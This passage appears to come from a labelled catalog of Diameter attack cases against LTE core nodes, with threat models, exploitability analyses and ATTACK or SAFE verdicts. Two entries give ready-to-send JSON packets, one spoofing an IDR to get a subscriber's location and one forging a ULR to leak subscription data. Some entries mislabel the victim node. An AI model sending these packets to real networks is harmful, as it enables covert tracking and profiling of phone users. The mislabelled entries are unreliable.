After receiving the spoofed IDR, the victim MME accepts it as a legitimate request from the HSS and processes the location request encoded in `IDR-Flags`. In this message, `IDR-Flags = 24`, which sets bit 3 (`EPS Location Information Request`) and bit 4 (`Current Location Request`). Therefore, the MME returns the target UE's current or last-known EPS location information in the corresponding IDA.

This is a privacy-leakage attack: the returned `EPS-Location-Information` may include `MME-Location-Information` fields such as `Tracking-Area-Identity` and `E-UTRAN-Cell-Global-Identity`. These identifiers can be mapped to a physical tracking area or serving cell using public or crowdsourced cellular databases such as OpenCellID. As a result, the attacker obtains a network-side location snapshot of the target UE, and repeated exploitation can be used to track the user's movements over time.

**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 319,
"application_id": 16777251

  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "hss1.system.com;1732377600;10"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "IDR-Flags",
      "avp_value": 24
    },
    {
      "avp_name": "Subscription-Data",
      "grouped_avp": [ ]
    }
  ]
}
**Classification:**
ATTACK

## 10) ULA - Subscription-Data
**Message:** Update-Location-Answer (ULA)
**Target Diameter Field:** Subscription-Data
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a MME and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.


**Exploitability Analysis:**

After receiving the spoofed ULR, the victim HSS accepts it as a legitimate Update-Location-Request from an MME for the target IMSI. Because the `Skip-Subscriber-Data` bit is not set in `ULR-Flags`, the HSS includes the target subscriber's `Subscription-Data` in the corresponding ULA. As a result, a single forged ULR discloses the target UE's LTE subscription profile.

This is a privacy and attack-enablement issue. The leaked `Subscription-Data` can reveal subscriber-specific provisioning details such as `MSISDN`, APN configurations, `Context-Identifier` values, access restrictions, ODB status, QoS profiles, and AMBR values. In particular, `MSISDN` links the target IMSI to the subscriber's phone number, enabling identity correlation and targeted follow-on abuse. These fields also let the attacker craft follow-on IDR or DSR messages that match the victim's real profile, for example deleting a specific APN context or modifying access/barring settings without guessing subscriber-specific parameters. 


**Attack Procedure:**

The attacker crafts a Message Update-Location-Request (ULR), ensuring that only mandatory fields are included with a well-formed structure and valid values, while all other unrelated AVPs are excluded. This allows the victim HSS to correctly parse and handle the request. Specifically, the attacker leaves the Skip-Subscriber-Data bit unset in the ULR-Flags AVP, so the HSS is expected to include the target subscriber’s Subscription-Data in the corresponding ULA. The attacker sends the crafted ULR to the victim HSS to trigger the disclosure of subscription information in the corresponding Diameter answer.

After processing the request, the HSS returns an Update-Location-Answer (ULA) containing the Subscription-Data AVP. This is an information disclosure issue because Subscription-Data includes privacy-sensitive subscription parameters (such as APN settings, access restrictions, and QoS profiles). With these details, the attacker can prepare more precise follow-on Diameter messages (e.g., IDR/DSR) that are tailored to the subscriber’s configuration, making service disruption or manipulation easier. The PoC is successful when the attacker receives a ULA where Subscription-Data is present and includes actual subscription details.


**Attack Message:**
The following is a complete test packet in a fixed JSON structure. Testers only need to substitute the environment-specific variables with actual values from their target environment to use it directly for real testing.

{
  "diameter_header": {
    "version": 1,
    "command_code": 316,
"application_id": 16777251
  },
  "avps": [
    {
      "avp_name": "Session-Id",
      "avp_value": "mme1.system.com;1732377600;8"
    },
    {
      "avp_name": "Vendor-Specific-Application-Id",
      "grouped_avp": [
        {
          "avp_name": "Vendor-Id",
          "avp_value": 10415
        },
        {
          "avp_name": "Auth-Application-Id",
          "avp_value": 16777251
        }
      ]
    },
    {
      "avp_name": "Auth-Session-State",
      "avp_value": 1
    },
    {
      "avp_name": "Origin-Host",
      "avp_value": "mme1.system.com"
    },
    {
      "avp_name": "Origin-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "Destination-Host",
      "avp_value": "hss1.system.com"
    },
    {
      "avp_name": "Destination-Realm",
      "avp_value": "system.com"
    },
    {
      "avp_name": "User-Name",
      "avp_value": "460000123456001"
    },
    {
      "avp_name": "RAT-Type",
      "avp_value": 1004,
    },
    {
      "avp_name": "ULR-Flags",
      "avp_value": 2
    },
    {
      "avp_name": "Visited-PLMN-Id",
      "avp_value": "64F000"
    }
  ]
}
**Classification:**
ATTACK

## 11) AIR - Immediate-Response-Preferred

**Message:** Authentication-Information-Request (AIR)
**Target Diameter Field:** Requested-EUTRAN-Authentication-Info.Immediate-Response-Preferred  


**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element HSS provides authentication vectors to trusted MMEs over the Diameter interface.
We assume: (i) the victim HSS's Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an MME and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE's IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**  
Immediate-Response-Preferred tells the HSS whether the authentication data requested in a particular AIR is needed immediately. If an attacker manipulates this AVP, the impact is limited to how the HSS handles that one rogue AIR and the AIA it sends back in response. In other words, it may affect whether the HSS generates authentication vectors for that transaction and how it returns them, but the effect stops there. It does not alter subscriber data, serving state, or any other persistent state in the HSS. Just as importantly, the resulting AIA is sent back only to the attacker's fake MME, not to the legitimate MME involved in the subscriber's real registration procedure. So even if the attacker changes this AVP, it does not directly affect the normal UE registration flow and is not, by itself, a meaningful lever for additional security abuse under the single-request threat model.

**Classification:**
SAFE

## 12) IDR - Visited-Network-Identifier
**Message:** Insert-Subscriber-Data-Request (IDR)
**Target Diameter Field:** Subscription-Data.APN-Configuration.Visited-Network-Identifier
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
Visited-Network-Identifier is an informational field recording the identity of the network where a dynamic PDN-GW was allocated, defined purely for record-keeping purposes. The 3GPP specification does not mandate the victim MME to validate this value or use it for any critical decision. The MME accepts and stores the value without using it for routing, access control, or session validation, thus it cannot cause any service impact.

**Classification:**
SAFE


## 13) IDR - RAT-Frequency-Selection-Priority-ID


**Message:** Insert-Subscriber-Data-Request (IDR)
**Target Diameter Field:** Subscription-Data.RAT-Frequency-Selection-Priority-ID

**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
RAT-Frequency-Selection-Priority-ID is a radio optimization parameter that influences UE preferences for RAT/frequency selection during handover. This AVP does not control core authorization, subscription barring, APN selection, or QoS allocation. A malicious value may at most bias the UE toward a less optimal frequency band, but the UE still retains normal service and will not be denied access or detached. The effect is limited to the local MME context and will be restored on subsequent attach or legitimate HSS update.


**Classification:**
SAFE


## 14) ULR - Homogeneous-Support-of-IMS-Voice-Over-PS-Sessions
**Message:** Update-Location-Request (ULR)
**Target Diameter Field:** Homogeneous-Support-of-IMS-Voice-Over-PS-Sessions

**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a MME and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.

**Exploitability Analysis:**

The Homogeneous-Support-of-IMS-Voice-Over-PS-Sessions field does not introduce an additional security impact under the our Threat model. This field only indicates whether the claimed serving MME has homogeneous IMS Voice over PS support. It is a capability description of the claimed serving node, not a control field that determines UE registration, bearer establishment, network connectivity, or HSS-side security behavior. Changing this field does not make the attacker more capable of serving the UE. The attacker is only an Internet host and cannot provide real MME functions, radio access, bearer handling, or IMS voice service. Therefore, whether this field is set to `SUPPORTED`, `NOT_SUPPORTED`, or omitted, it directly affects neither the UE's actual connectivity nor the HSS's subsequent behavior. Unlike `ULR-Flags`, which can change how the HSS processes the Update-Location procedure, this field does not create a field-specific effect beyond the forged ULR itself. Even if the forged ULR causes a temporary service disruption, that effect is caused by the ULR procedure itself, not by this field. In practice, because the attacker cannot actually serve the UE, the UE will reconnect through a legitimate MME. The legitimate MME will then update the HSS and overwrite the value associated with the forged request.

**Classification:**
SAFE

## 15) IDR - Restoration-Priority

**Message:** Insert-Subscriber-Data-Request (IDR)
**Target Diameter Field:** Subscription-Data.APN-Configuration-Profile.APN-Configuration.Restoration-Priority 
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
Restoration-Priority is a configuration hint indicating the relative priority for restoring PDN connections after failures or restarts. This AVP does not control access authorization, APN selection, or real-time QoS—it is only consulted during MME/SGW/PGW recovery procedures. Under the single-message attack model, the attacker cannot trigger such recovery events, and any effect would be overridden by subsequent legitimate HSS updates, making persistent impact infeasible.

**Classification:**
SAFE


## 16) CLR - CLR-Flags
**Message:** Cancel-Location-Request (CLR)
**Target Diameter Field:** CLR-Flags
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim MME's Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate an HSS and establish a Diameter connection to the victim MME; (iii) the victim MME does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim MME processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE's IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
The security impact of a forged CLR is determined by `Cancellation-Type`, not by `CLR-Flags`. Manipulating `CLR-Flags` does not decide whether subscriber data are deleted, whether the UE is detached, or whether authorization state changes. Its main effect is whether the UE is explicitly told to re-attach immediately. But once the forged CLR has already caused the MME to clear subscriber context or detach the UE, the UE would normally try to attach again anyway in order to regain service. So `CLR-Flags` does not add meaningful attack leverage beyond the underlying CLR and should be classified as SAFE.
**Classification:**
SAFE

## 17) AIR - Re-Synchronization-Info
**Message:** Authentication-Information-Request (AIR)
**Target Diameter Field:** Requested-EUTRAN-Authentication-Info.Re-Synchronization-Info
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element MME provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a MME and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
The AUTS value in Re-Synchronization-Info must contain a valid MAC computed using the subscriber's secret key K. the victim HSS performs mandatory cryptographic verification before any resynchronization occurs. Without the secret key K, the attacker's forged AUTS fails MAC verification, causing the victim HSS to return an error without providing authentication vectors or altering the subscriber's stored authentication state.
**Classification:**
SAFE

## 18) PPR - Origin-Host

**Message:** Push-Profile-Request (PPR)
**Target Diameter Field:** Origin-Host

**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element S-CSCF provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim S-CSCF’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a HSS and establish a Diameter connection to the victim S-CSCF; (iii) the victim S-CSCF does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim S-CSCF processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
Origin-Host is the standard Diameter node identity of the message sender, used by the S-CSCF for peer identification and message correlation, not stored as subscriber data. This AVP cannot modify service authorization, IMS filter criteria, or routing to Application Servers. Any actual impact on subscriber service (e.g., barring, profile modification) would require other AVPs carrying actual configuration content, not Origin-Host itself.


**Classification:**
SAFE


## 19) SAA - Priviledged-Sender-Indication
**Message:**  Server-Assignment-Answer (SAA)
**Target Diameter Field:** Priviledged-Sender-Indication
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element S-CSCF provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a S-CSCF and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
The attacker obtains the Priviledged-Sender-Indication AVP from the Server-Assignment-Answer, but this information disclosure has no security impact because the Priviledged-Sender-Indication is merely a binary service attribute flag (PRIVILEDGED_SENDER or NOT_PRIVILEDGED_SENDER) that indicates IMS service priority treatment; this flag does not contain sensitive subscriber data or security-critical information, and knowledge of a user's privileged sender status cannot help the attacker execute further attacks against subscribers or the network.
**Classification:**
SAFE

## 20) MAA - OC-OLR
**Message:**  Multimedia-Auth-Answer (MAA)
**Target Diameter Field:** OC-OLR
**Threat Model:**
- **Attack Assumption:**
In the target 4G/LTE network, a network element S-CSCF provides cellular services to subscriber UEs by coordinating with other trusted HSS nodes over the Diameter interface.
We assume: (i) the victim HSS’s Diameter interface is exposed to the public Internet due to misconfiguration; (ii) an Internet attacker can impersonate a S-CSCF and establish a Diameter connection to the victim HSS; (iii) the victim HSS does not enable IPsec/TLS and thus cannot authenticate the identity of the attacker; (iv) the victim HSS processes attacker-crafted Diameter Requests and returns the corresponding Diameter Answers on the same connection; and (v) the attacker has obtained the target UE’s IMSI.
- **Attacker Capability:**
The attacker is limited to interacting with the victim HSS over the Diameter connection established by the attacker itself. For each attack attempt, the attacker actively sends a Diameter Request message on this connection and passively receives the corresponding Diameter Answer message returned by the victim HSS. The attacker cannot observe, modify, or interfere with Diameter traffic on connections between legitimate network elements.
**Exploitability Analysis:**
The attacker can obtain the OC-OLR (Overload Control – Overload Report) AVP from the Multimedia-Auth-Answer, but this information disclosure has no security impact because the OC-OLR only contains non-sensitive operational data (load indicators and traffic management instructions) that is designed to be shared with all connected peers for load management; the disclosed OC-OLR does not contain sensitive subscriber data or security-critical information, and knowledge of the HSS's overload status cannot help the attacker execute further attacks against subscribers or the network.
**Classification:**
SAFE
